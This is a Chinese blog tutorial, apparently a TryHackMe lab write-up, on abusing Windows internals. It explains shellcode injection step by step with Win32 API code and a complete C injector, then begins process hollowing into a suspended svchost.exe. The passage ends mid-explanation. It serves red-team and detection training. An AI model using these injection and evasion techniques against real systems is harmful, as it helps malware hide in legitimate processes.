class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/TryHackMe/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>TryHackMe</span></a></span></div></div><h1 class="post-title" itemprop="name headline">THM-滥用Windows内部机制</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-07-31T08:29:45.000Z" title="发表于 2024-07-31 16:29:45">2024-07-31</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-08-01T08:11:57.358Z" title="更新于 2024-08-01 16:11:57">2024-08-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">22.8k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>79分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="THM-滥用Windows内部机制"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/07/31/thm-lan-yong-windows-nei-bu-ji-zhi/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/07/31/thm-lan-yong-windows-nei-bu-ji-zhi/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2024/07/31/thm-lan-yong-windows-nei-bu-ji-zhi/"><header><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a><a href="/tags/TryHackMe/" tabindex="-1" itemprop="url">TryHackMe</a><h1 id="CrawlerTitle" itemprop="name headline">THM-滥用Windows内部机制</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2024-07-31T08:29:45.000Z" title="发表于 2024-07-31 16:29:45">2024-07-31</time><time itemprop="dateCreated datePublished" datetime="2024-08-01T08:11:57.358Z" title="更新于 2024-08-01 16:11:57">2024-08-01</time></header><p>利用与工具无关的现代方法，利用 Windows 内部组件来逃避常见的检测解决方案。</p>
+<h1 id="0x01-简介">0x01 简介</h1>
+<p>Windows 内部机制是 Windows 操作系统运作的核心，这为网络安全威胁参与者提供了一个有利可图的恶意利用目标，Windows 内部机制可被攻击者用于隐藏和执行代码、规避检测以及与其他恶意技术或漏洞利用程序相关联。</p>
+<p>“Windows 内部机制”这个术语可以涵盖在Windows操作系统后端找到的任何组件，这可以包括进程、文件格式、COM(组件对象模型)、任务调度、I/O系统等。本文将重点介绍如何滥用(恶意利用)进程及其组件、DLL(动态链接库)和PE(可移植可执行文件)格式。</p>
+<p><strong>本文学习目标</strong></p>
+<ol>
+<li>了解Windows内部组件为何容易受到攻击；</li>
+<li>了解如何滥用和利用Windows内部机制漏洞；</li>
+<li>了解关于Windows内部机制滥用技术的缓解措施和检测方法；</li>
+<li>将Windows内部机制滥用技术应用于研究现实世界中的网络安全威胁模拟案例。</li>
+</ol>
+<p>在开始学习本文相关内容之前，建议读者能够对Windows的基本用法和功能有一个大致的了解，还建议读者具备关于c++和PowerShell的基础编程知识(但这不是必需的)；此外，还需要预先阅读以下知识点文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hekeats-L/p/17847693.html">【THM】Windows Internals(Windows内部机制基础)-红队</a></p>
+<p>在与本文相关的Tryhackme房间中，THM为我们提供了一台基本的Windows机器，其中包含了完成本文相关操作所需的文件，我们可以直接在与本文相关的THM房间中部署实验环境并使用给定的浏览器页面直接访问实验虚拟机或者使用以下凭据在自己的攻击机上通过RDP访问实验虚拟机。</p>
+<ul>
+<li>Machine IP:&nbsp;<code>MACHINE_IP</code>(在Tryhackme实验房间页面中部署机器，然后我们将随机获得相关的IP地址)</li>
+<li>Username:&nbsp;<code>THM-Attacker</code></li>
+<li>Password:&nbsp;<code>Tryhackme!</code></li>
+</ul>
+<h1 id="0x02-滥用进程shellcode注入">0x02 滥用进程(shellcode注入)</h1>
+<p>在操作系统上运行的应用程序可以包含一个或多个进程，而进程维护并代表着正在执行的程序。</p>
+<p>进程具有许多其他子组件并且它们能直接与内存或虚拟内存进行交互，下表简单描述了进程的每个关键组件及其用途。</p>
+<table>
+<thead>
+<tr>
+<th>进程组件</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Private Virtual Address Space(私有虚拟地址空间)</td>
+<td>分配给进程的虚拟内存地址</td>
+</tr>
+<tr>
+<td>Executable Program(可执行程序)</td>
+<td>定义存储在虚拟地址空间中的代码和数据</td>
+</tr>
+<tr>
+<td>Open Handles(打开句柄)</td>
+<td>定义进程可访问的系统资源的句柄</td>
+</tr>
+<tr>
+<td>Security Context(安全上下文)</td>
+<td>由访问令牌定义的用户、安全组、权限和其他安全信息</td>
+</tr>
+<tr>
+<td>Process ID(进程标识符)</td>
+<td>进程的唯一数字标识符</td>
+</tr>
+<tr>
+<td>Threads(线程)</td>
+<td>计划执行的进程的一部分</td>
+</tr>
+</tbody>
+</table>
+<p>tips： “Handles”(句柄) 通常指的是对资源的引用或标识，而 “Open” 则表示这些引用当前处于打开状态，所以"Open Handles"指向的是某个程序或进程正在使用或占用的资源。</p>
+<p>有关进程的详细信息，请参阅：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hekeats-L/p/17847693.html">【THM】Windows Internals(Windows内部机制基础)-红队</a></p>
+<p>进程注入通常被用作一个总括性的术语，它用于描述通过合法功能或组件将恶意代码注入到进程中。在本文中，我们将重点介绍四种不同类型的进程注入，相关概述如下所示：</p>
+<table>
+<thead>
+<tr>
+<th>注入类型</th>
+<th>功能/作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1055/012/">Process Hollowing(进程镂空，傀儡进程)</a></td>
+<td>将代码注入到一个被挂起和被镂空的目标进程中</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1055/003/">Thread Execution Hijacking(线程执行劫持)</a></td>
+<td>将代码注入到被挂起的目标线程中</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1055/001/">Dynamic-link Library Injection(动态链接库注入)</a></td>
+<td>将DLL注入到进程内存中</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1055/002/">Portable Executable Injection(PE注入)</a></td>
+<td>将指向恶意函数的 PE 映像自行注入到目标进程中</td>
+</tr>
+</tbody>
+</table>
+<p>关于一些其他形式的进程注入的概述，请参考：<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1055/">MITRE T1055</a>。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408011605521.png" alt></p>
+<p>从最基本的层面上看，进程注入采取的形式是shellcode注入。</p>
+<p>概括性地说，shellcode注入可以分为以下四个步骤：</p>
+<ol>
+<li>打开具有所有访问权限的目标进程；</li>
+<li>为shellcode分配目标进程内存；</li>
+<li>将shellcode写入目标进程中已分配的内存；</li>
+<li>使用远程线程执行shellcode。</li>
+</ol>
+<p>上面的这些步骤还可以以图形化的形式进行分解，以便更好地描述相关的Windows API调用是如何与进程内存进行交互的。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408011605522.png" alt></p>
+<p>接下来我们将分解一个基本的shellcode注入器来认识shellcode注入的每个步骤，并在下面进行更深入的解释。</p>
+<p>在shellcode注入的第一步操作中，我们需要使用特殊的参数来打开一个目标进程，我们将使用<code>OpenProcess</code>来打开通过命令行提供的目标进程：</p>
+<pre><code class="hljs C#"><span class="hljs-comment">// 使用 OpenProcess 打开目标进程，这将返回一个进程句柄（processHandle）</span>
+processHandle = OpenProcess(
+	PROCESS_ALL_ACCESS, <span class="hljs-comment">// Defines access rights 定义访问权限，此处使用 PROCESS_ALL_ACCESS 表示打开的进程句柄将具有对进程的所有访问权限</span>
+	FALSE, <span class="hljs-comment">// Target handle will not be inhereted 目标句柄不会被继承</span>
+	DWORD(atoi(argv[<span class="hljs-number">1</span>])) <span class="hljs-comment">// Local process supplied by command-line arguments  由命令行参数提供的本地进程ID</span>
+);
+
+<span class="hljs-comment">//PROCESS_ALL_ACCESS: 表示打开的进程句柄将具有对进程的所有访问权限，这可能是过于宽泛的权限，实际应用中应根据需要选择更精确的权限。</span>
+
+<span class="hljs-comment">//FALSE: 表示目标句柄不会被继承到由此进程创建的子进程中，这样可以确保打开的进程句柄不会被不需要的子进程继承。</span>
+
+<span class="hljs-comment">//DWORD(atoi(argv[1])): 表示由命令行参数提供的本地进程ID，其中argv[1]是命令行参数的第二个元素，我们通过atoi函数将字符串转换为整数（进程ID）然后再通过DWORD(...)将这个整数强制转换为 DWORD 类型，以便符合 OpenProcess 函数的参数类型。</span>
+<span class="hljs-comment">//命令行参数示例：MyProgram.exe &lt;ProcessID&gt;  //这样DWORD(atoi(argv[1]))会将字符串形式的进程ID最终转换成DWORD类型</span></code></pre>
+<p>在shellcode注入的第二步操作中，我们必须根据 shellcode 的字节大小来分配内存，内存分配将使用<code>VirtualAllocEx</code>进行处理。在API调用中，我们还需要使用<code>sizeof</code>函数来定义<code>dwSize</code>参数，以获取要分配的shellcode字节大小。</p>
+<pre><code class="hljs C#">remoteBuffer = VirtualAllocEx(
+	processHandle, <span class="hljs-comment">// Opened target process 表示被打开的目标进程，即目标进程的句柄</span>
+	NULL, 
+	<span class="hljs-keyword">sizeof</span> shellcode, <span class="hljs-comment">// Region size of memory allocation 内存分配的区域大小</span>
+	(MEM_RESERVE | MEM_COMMIT), <span class="hljs-comment">// Reserves and commits pages 保留和提交内存页面</span>
+	PAGE_EXECUTE_READWRITE <span class="hljs-comment">// Enables execution and read/write access to the commited pages 启用对已提交内存页面的执行和读/写访问权限</span>
+);
+
+<span class="hljs-comment">//MEM_RESERVE： 表示保留一块虚拟地址空间，但不分配物理内存。这允许您在将来的某个时候通过调用 VirtualAlloc 或 VirtualAllocEx 来分配实际的物理内存。</span>
+<span class="hljs-comment">//MEM_COMMIT： 表示分配物理内存并将其与先前保留的虚拟地址空间关联起来。这样，可以确保已经保留的地址空间在物理内存中有相应的存储。</span>
+<span class="hljs-comment">//使用 (MEM_RESERVE | MEM_COMMIT) 的组合标志，可以在分配内存时同时保留地址空间并分配实际的物理内存，这通常用于将虚拟地址空间与物理内存关联起来，以便在之后可以直接使用这些内存。</span>
+
+<span class="hljs-comment">//PAGE_EXECUTE_READWRITE：将内存页设置为既可读又可写且可执行的状态。</span>
+
+
+<span class="hljs-comment">//以下是 VirtualAllocEx 函数的声明：</span>
+<span class="hljs-comment">//LPVOID VirtualAllocEx(</span>
+<span class="hljs-comment">//  HANDLE hProcess,      // 目标进程的句柄</span>
+<span class="hljs-comment">//  LPVOID lpAddress,     // 指定要分配的内存的首选地址，可以为 NULL</span>
+<span class="hljs-comment">//  SIZE_T dwSize,        // 指定要分配的内存大小，以字节为单位</span>
+<span class="hljs-comment">//  DWORD  flAllocationType,  // 指定内存的类型和状态</span>
+<span class="hljs-comment">//  DWORD  flProtect           // 指定内存页的保护属性</span>
+<span class="hljs-comment">//);</span></code></pre>
+<p>在shellcode注入的第三步操作中，我们可以使用已经分配的内存区域来写入我们的shellcode，<code>WriteProcessMemory</code>通常被用于写入shellcode到内存区域。</p>
+<pre><code class="hljs C#">WriteProcessMemory(
+	processHandle, <span class="hljs-comment">// Opened target process 表示被打开的目标进程，即目标进程的句柄</span>
+	remoteBuffer, <span class="hljs-comment">// Allocated memory region 已经分配好的内存区域</span>
+	shellcode, <span class="hljs-comment">// Data to write 要写入的数据（例如 shellcode）</span>
+	<span class="hljs-keyword">sizeof</span> shellcode, <span class="hljs-comment">// byte size of data  要写入的数据的字节大小</span>
+	NULL
+);
+
+<span class="hljs-comment">//processHandle: 目标进程的句柄，表示要写入的进程。</span>
+<span class="hljs-comment">//remoteBuffer: 在目标进程中已经通过 VirtualAllocEx 或类似函数分配好的内存区域的起始地址。</span>
+<span class="hljs-comment">//shellcode: 要写入到目标进程内存中的数据，通常是一段二进制代码（如 shellcode）。</span>
+<span class="hljs-comment">//sizeof shellcode: 数据的字节大小，即 shellcode 的大小。</span>
+<span class="hljs-comment">//NULL: 可以是一个用于接收实际写入的字节数的指针，但在此情况下未使用。</span></code></pre>
+<p>最后是shellcode注入的第四步，此时我们可以控制目标进程，并且我们的恶意代码也被写入到了内存中，现在我们的目的是执行驻留在内存中的shellcode，为此我们可以使用<code>CreateRemoteThread</code>来通过线程控制进程的执行。</p>
+<pre><code class="hljs c#">remoteThread = CreateRemoteThread(
+	processHandle, <span class="hljs-comment">// Opened target process 表示被打开的目标进程，即目标进程的句柄</span>
+	NULL, 
+	<span class="hljs-number">0</span>, <span class="hljs-comment">// Default size of the stack 堆栈的默认大小</span>
+	(LPTHREAD_START_ROUTINE)remoteBuffer, <span class="hljs-comment">// Pointer to the starting address of the thread 指向线程起始地址的指针</span>
+	NULL, 
+	<span class="hljs-number">0</span>, <span class="hljs-comment">// Ran immediately after creation 表示创建后立即运行</span>
+	NULL
+);
+
+<span class="hljs-comment">//参数解释：</span>
+<span class="hljs-comment">//processHandle: 目标进程的句柄，表示在其中创建远程线程。</span>
+<span class="hljs-comment">//NULL: 默认安全描述符（Security Descriptor），使用默认值。</span>
+<span class="hljs-comment">//0: 默认堆栈大小，系统将为线程提供默认的堆栈大小。</span>
+<span class="hljs-comment">//(LPTHREAD_START_ROUTINE)remoteBuffer: 线程的起始地址，通常是已经在远程进程分配的内存中的代码；remoteBuffer是一个指向远程进程内存中代码的指针。</span>
+<span class="hljs-comment">//NULL: 线程的参数，通常设置为 NULL。</span>
+<span class="hljs-comment">//0: 线程的创建标志，表示线程在被创建后立即运行。</span>
+<span class="hljs-comment">//NULL: 线程ID，接收新线程的标识符，通常设置为 NULL。</span>
+
+<span class="hljs-comment">//这段代码使用CreateRemoteThread函数在目标进程中创建一个远程线程，并让该线程执行remoteBuffer中的代码；通常，remoteBuffer包含了一些能够在目标进程中执行的二进制代码，例如shellcode。</span>
+<span class="hljs-comment">//请注意，创建远程线程需要足够的权限，并且最终执行的代码必须符合目标进程的架构。</span></code></pre>
+<p>我们可以将上述这四个步骤编译在一起，以便创建一个简单的进程注入器。</p>
+<pre><code class="hljs c"><span class="hljs-comment">//shellcode-injector.c</span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+
+<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] = <span class="hljs-string">""</span>;
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> {
+    HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (atoi(argv[<span class="hljs-number">1</span>])));
+    PVOID b_shellcode = VirtualAllocEx(h_process, <span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span> shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(h_process, b_shellcode, shellcode, <span class="hljs-keyword">sizeof</span> shellcode, <span class="hljs-literal">NULL</span>);
+    HANDLE h_thread = CreateRemoteThread(h_process, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)b_shellcode, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);
+}</code></pre>
+<p>Shellcode注入是进程注入的最基本形式，在本文的下一小节中，我们将研究如何修改和调整上述这些shellcode注入步骤以实现进程镂空(傀儡进程)技术。</p>
+<p>可以打开任务管理器，查看Details，可以看到用户对应的进程</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408011605523.png" alt></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408011605524.png" alt></p>
+<h1 id="0x03-关于进程滥用的扩展进程镂空">0x03 关于进程滥用的扩展(进程镂空)</h1>
+<p>在上一个小节中，我们讨论了如何使用shellcode注入将恶意代码注入合法进程。 在本小节中，我们将介绍进程镂空，与shellcode注入类似，该技术提供了将整个恶意文件注入进程的能力。 这是通过“镂空”或取消进程的内存映射并且向进程中注入特定的 PE（可移植可执行文件）数据和节来实现的。</p>
+<p>概括性地说，进程镂空可以分为以下六个步骤：</p>
+<ol>
+<li>
+<p>创建处于挂起状态的目标进程。</p>
+</li>
+<li>
+<p>打开恶意映像(malicious image)。</p>
+</li>
+<li>
+<p>从进程内存中取消对合法代码的映射。</p>
+</li>
+<li>
+<p>为恶意代码分配内存位置，并将每个PE节写入地址空间。</p>
+</li>
+<li>
+<p>为恶意代码设置入口点。</p>
+</li>
+<li>
+<p>使目标进程脱离挂起状态。</p>
+</li>
+</ol>
+<p>tips：“malicious image” 通常指的是一个包含了恶意软件、病毒、木马或其他恶意代码的文件，这个文件可以是二进制可执行文件、图像文件或其他形式的文件。</p>
+<p>上面的这些步骤还可以以图形化的形式进行分解，以便更好地描述相关的Windows API调用是如何与进程内存进行交互的。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408011605525.png" alt></p>
+<p>接下来我们将分解一个基本的进程镂空注入器来认识进程镂空的每个步骤，并在下面进行更深入的解释。</p>
+<p>在进程镂空的第一步中，我们必须使用&nbsp;<code>CreateProcessA</code>&nbsp;创建一个处于挂起状态的目标进程，为了获取 API 调用所需的参数，我们可以使用<code>STARTUPINFOA</code>结构体和<code>PROCESS_INFORMATION</code>结构体。</p>
+<pre><code class="hljs c#"><span class="hljs-comment">//创建一个 STARTUPINFOA 结构体的实例，用于指定新进程的启动信息</span>
+LPSTARTUPINFOA target_si = <span class="hljs-keyword">new</span> STARTUPINFOA(); <span class="hljs-comment">// 定义进程的窗口站、桌面、句柄和外观</span>
+
+<span class="hljs-comment">//创建一个 PROCESS_INFORMATION 结构体的实例，用于接收有关新进程的信息</span>
+LPPROCESS_INFORMATION target_pi = <span class="hljs-keyword">new</span> PROCESS_INFORMATION(); <span class="hljs-comment">// 有关进程和主线程的信息</span>
+
+<span class="hljs-comment">//c被声明为一个CONTEXT类型的变量（那么&amp;c就是一个指向CONTEXT类型结构的指针），此段代码并未使用c，c将留待下文代码段使用</span>
+CONTEXT c; <span class="hljs-comment">//Context structure pointer 此处的注释提到指向上下文结构(CONTEXT)的指针，可能是因为在后续操作中实际使用的是&amp;c。</span>
+
+<span class="hljs-keyword">if</span> (CreateProcessA(
+	(LPSTR)<span class="hljs-string">"C:\\\\Windows\\\\System32\\\\svchost.exe"</span>, <span class="hljs-comment">//要执行的模块的名称</span>
+	NULL,
+	NULL,
+	NULL,
+	TRUE, <span class="hljs-comment">// Handles are inherited from the calling process 句柄继承自调用进程 </span>
+	CREATE_SUSPENDED, <span class="hljs-comment">// New process is suspended 新进程已经挂起</span>
+	NULL,
+	NULL,
+	target_si, <span class="hljs-comment">// pointer to startup info 指向启动信息的指针(target_si)</span>
+	target_pi) == <span class="hljs-number">0</span>) { <span class="hljs-comment">// pointer to process information 指向进程信息的指针(target_pi)</span>
+	cout &lt;&lt; <span class="hljs-string">"[!] Failed to create Target process. Last Error: "</span> &lt;&lt; GetLastError();
+	<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+    };
+<span class="hljs-comment">//上面这部分代码是使用 WinAPI 中的 CreateProcessA 函数来创建一个新的进程，在创建进程时还将指定一些启动参数。</span>
+<span class="hljs-comment">//CreateProcessA 函数用于创建新进程，接受多个参数，包括新进程的执行模块、启动信息、新进程是否继承调用进程的句柄、以及新进程是否在创建时挂起等。</span>
+<span class="hljs-comment">//target_si 是一个 STARTUPINFOA 结构体的指针，用于指定新进程的启动信息。</span>
+<span class="hljs-comment">//target_pi 是一个 PROCESS_INFORMATION 结构体的指针，用于接收有关新进程的信息，包括新进程的句柄和主线程的句柄等。</span>
+<span class="hljs-comment">//如果 CreateProcessA 调用失败，将输出错误信息，并返回 1。</span></code></pre>
+<p>在进程镂空的第二步中，我们需要打开一个恶意映像来进行注入，此过程又分为三个步骤，首先，我们需要使用<code>CreateFileA</code>来获取恶意映像的句柄：</p>
+<pre><code class="hljs c#">HANDLE hMaliciousCode = CreateFileA(
+	(LPCSTR)<span class="hljs-string">"C:\\\\Users\\\\tryhackme\\\\malware.exe"</span>, <span class="hljs-comment">// Name of image to obtain 获取到的映像名称</span>
+	GENERIC_READ, <span class="hljs-comment">// Read-only access 只读访问权限</span>
+	FILE_SHARE_READ, <span class="hljs-comment">// Read-only share mode 只读共享模式</span>
+	NULL,
+	OPEN_EXISTING, <span class="hljs-comment">// Instructed to open a file or device if it exists 指示打开文件或设备(如果存在)</span>
+	NULL,
+	NULL
+);
+
+
+<span class="hljs-comment">//这段代码使用 `CreateFileA` 函数来打开一个恶意文件并获取其句柄：</span>
+<span class="hljs-comment">//以下是关于代码段中的参数的解释：</span>
+
+<span class="hljs-comment">//1. `(LPCSTR)"C:\\\\Users\\\\tryhackme\\\\malware.exe"`：指定要打开的文件的完整路径，此处的路径是 "C:\\Users\\tryhackme\\malware.exe"。</span>
+
+<span class="hljs-comment">//2. `GENERIC_READ`：访问权限，表示以只读方式打开文件；`GENERIC_READ` 是一个常量，它指定了读取文件的权限。</span>
+
+<span class="hljs-comment">//3. `FILE_SHARE_READ`：共享模式，表示允许其他进程以只读方式共享该文件；这里指定的是只读共享模式。</span>
+
+<span class="hljs-comment">//4. `NULL`：安全属性，这是一个指向SECURITY_ATTRIBUTES结构体的指针，指定了安全描述符；为 `NULL`时表示不使用安全属性。</span>
+
+<span class="hljs-comment">//5. `OPEN_EXISTING`：打开模式，表示如果文件或设备存在就打开它；这里的目的是打开一个已经存在的文件。</span>
+
+<span class="hljs-comment">//6. `NULL`：模板句柄，指向一个句柄，表示新建文件的模板；在此代码片段中，因为是打开已存在的文件，所以不需要模板。</span>
+
+<span class="hljs-comment">//7. `NULL`：额外的文件属性和标志，这里设置为 NULL 表示没有额外的特殊属性或标志；当使用 `OPEN_EXISTING` 打开文件时，这个参数通常为 `NULL`。</span>
+
+<span class="hljs-comment">//该代码片段的效果是打开名为 "malware.exe" 的恶意文件，并获取到此恶意文件的句柄（`hMaliciousCode`）。</span>
+<span class="hljs-comment">//这样的操作通常是想要在分析、执行或进行其他文件相关操作之前先获取到文件的句柄，需要注意的是，对于恶意软件（malware）的处理需要谨慎，确保在受控环境中进行。</span></code></pre>
+<p>其次，在获取恶意映像的句柄后，我们必须使用<code>VirtualAlloc</code>来将内存分配给本地进程，并且还需要使用<code>GetFileSize</code>来获取恶意映像的大小(<code>dwSize</code>)。</p>
+<pre><code class="hljs c#">DWORD maliciousFileSize = GetFileSize(
+	hMaliciousCode, <span class="hljs-comment">//Handle of malicious image 恶意映像的句柄</span>
+	<span class="hljs-number">0</span> <span class="hljs-comment">//Returns no error 无错误返回</span>
+);
+
+<span class="hljs-comment">//当GetFileSize函数的第二个参数不为零时，该参数是一个指向DWORD类型变量的指针，此时函数会将文件的大小写入到指针(即该参数)所指向的内存位置。</span>
+<span class="hljs-comment">//当GetFileSize函数的第二个参数为零时，函数将直接返回文件的大小。</span>
+<span class="hljs-comment">//注意：在我们将函数的第二个参数设置为0的情况下，GetFileSize函数并不会因此导致错误的返回。</span>
+
+PVOID pMaliciousImage = VirtualAlloc(
+	NULL,
+	maliciousFileSize, <span class="hljs-comment">//File size of malicious image 恶意映像的文件大小</span>
+	<span class="hljs-number">0x3000</span>, <span class="hljs-comment">//Reserves and commits pages (MEM_RESERVE | MEM_COMMIT) 保留和提交内存页面 (MEM_RESERVE | MEM_COMMIT)</span>
+	<span class="hljs-number">0x04</span> <span class="hljs-comment">//Enables read/write access (PAGE_READWRITE) 启用读/写访问权限 (PAGE_READWRITE)</span>
+);
+
+<span class="hljs-comment">//这段代码用于获取恶意映像文件的大小，并为其分配虚拟内存空间。</span>
+
+<span class="hljs-comment">//1. `DWORD maliciousFileSize = GetFileSize(hMaliciousCode, 0);`</span>
+<span class="hljs-comment">//使用 `GetFileSize` 函数获取恶意映像文件的大小。</span>
+<span class="hljs-comment">//- `hMaliciousCode` 是之前通过 `CreateFile` 打开恶意映像文件时得到的文件句柄。</span>
+<span class="hljs-comment">//- 参数 `0` 表示获取文件大小时不考虑文件指针的位置，直接返回整个文件的大小。</span>
+
